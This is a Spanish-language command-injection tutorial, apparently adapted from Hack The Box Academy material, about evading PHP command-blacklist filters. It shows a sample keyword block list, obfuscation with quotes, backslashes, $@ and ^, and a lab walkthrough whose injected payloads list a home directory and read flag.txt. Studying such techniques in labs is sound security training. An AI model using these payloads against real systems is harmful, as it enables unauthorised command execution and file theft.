
# Bypass de comandos en Blacklist

Hemos analizado varios métodos para eludir los filtros de un solo carácter. Sin embargo, existen diferentes métodos cuando se trata de eludir los comandos incluidos en la lista negra. Una lista negra de comandos generalmente consta de un conjunto de palabras y, si podemos ofuscar nuestros comandos y hacer que se vean diferentes, es posible que podamos eludir los filtros.

Existen varios métodos de ofuscación de comandos que varían en complejidad, como veremos más adelante con las herramientas de ofuscación de comandos. Trataremos algunas técnicas básicas que pueden permitirnos cambiar la apariencia de nuestro comando para eludir los filtros manualmente.

***

## <mark style="color:purple;">Lista negra de comandos</mark>

Hasta ahora hemos logrado pasar por alto con éxito el filtro de caracteres para los espacios y los puntos y comas en nuestra carga útil. Por lo tanto, volvamos a nuestra primera carga útil y volvamos a agregar el comando `whoami` para ver si se ejecuta:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_1.jpg" alt=""><figcaption></figcaption></figure>

Vemos que, aunque usamos caracteres que no están bloqueados por la aplicación web, la solicitud se vuelve a bloquear una vez que agregamos nuestro comando. Es probable que esto se deba a otro tipo de filtro, que es un filtro de lista negra de comandos.

Un filtro de lista negra de comandos básico `PHP` se vería así:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Como podemos ver, se comprueba cada palabra introducida por el usuario para ver si coincide con alguna de las palabras incluidas en la lista negra. Sin embargo, este código busca una coincidencia exacta del comando proporcionado, por lo que si enviamos un comando ligeramente diferente, es posible que no se bloquee. Afortunadamente, podemos utilizar varias técnicas de ofuscación que ejecutarán nuestro comando sin utilizar la palabra de comando exacta.

***

## <mark style="color:purple;">Linux y Windows</mark>

Una técnica de ofuscación muy común y sencilla es insertar ciertos caracteres dentro de nuestro comando que normalmente son ignorados por los intérpretes de comandos como `Bash` o `PowerShell` y ejecutarán el mismo comando como si no estuvieran allí. Algunos de estos caracteres son una comilla simple `'` y una comilla doble `"`, además de algunos otros.

Las más fáciles de usar son las comillas, y funcionan tanto en servidores Linux como Windows. Por ejemplo, si queremos ofuscar el comando `whoami`, podemos insertar comillas simples entre sus caracteres, de la siguiente manera:

```shell-session
afsh4ck@kali$ w'h'o'am'i

21y4d
```

Lo mismo funciona con comillas dobles:

```shell-session
afsh4ck@kali$ w"h"o"am"i

21y4d
```

Lo importante a recordar es que no podemos mezclar tipos de cotizaciones y el número de cotizaciones debe ser par. Podemos probar uno de los anteriores en nuestra carga útil (`127.0.0.1%0aw'h'o'am'i`) y ver si funciona:

#### **Solicitud POST de BurpSuite**

![Comandos de filtro](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_2.jpg)

Como podemos ver, este método realmente funciona.

***

## <mark style="color:purple;">Sólo Linux</mark>

Podemos insertar algunos otros caracteres exclusivos de Linux en medio de los comandos, y el shell bash los ignorará y ejecutará el comando. Estos caracteres incluyen la barra invertida `\` y el carácter de parámetro posicional `$@`. Esto funciona exactamente igual que con las comillas, pero en este caso el número de caracteres no tiene por qué ser par, y podemos insertar solo uno de ellos si queremos:

```bash
who$@ami
w\ho\am\i
```

***

## <mark style="color:purple;">Sólo Windows</mark>

También hay algunos caracteres exclusivos de Windows que podemos insertar en medio de los comandos que no afectan el resultado, como un `^`carácter de cursor ( ), como podemos ver en el siguiente ejemplo:

```powershell
C:\afsh4ck> who^ami

21y4d
```

En la siguiente sección, analizaremos algunas técnicas más avanzadas para la ofuscación de comandos y la elusión de filtros.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.62.166:41773
```

Utilice lo que aprendió en esta sección para buscar el contenido de flag.txt en la carpeta de inicio del usuario que encontró anteriormente.

En la sección anterior encontramos un usuario `1nj3c70r`, vamos a intentar leer la flag dentro del directorio. Con el siguiente payload encontramos la flag, listando todos los archivos del directorio:

```
ip=127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r
```

```bash
127.0.0.1 ls -la /home/1nj3c70r
```

<figure><img src="/files/tDCSaqAifTeDxipkQnXD" alt=""><figcaption></figcaption></figure>

Vamos a modificar el payload para leer la flag de la siguiente manera:

```bash
127.0.0.1 cat /home/1nj3c70r/flag.txt
```

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

{% hint style="info" %}
Observad que hemos dividido el comando cat con comillas para hacer el bypass: `c'a't`
{% endhint %}

<figure><img src="/files/RCn0dvihAmIKshKluw1y" alt=""><figcaption></figcaption></figure>

Como vemos conseguimos obtener la flag sin problema.
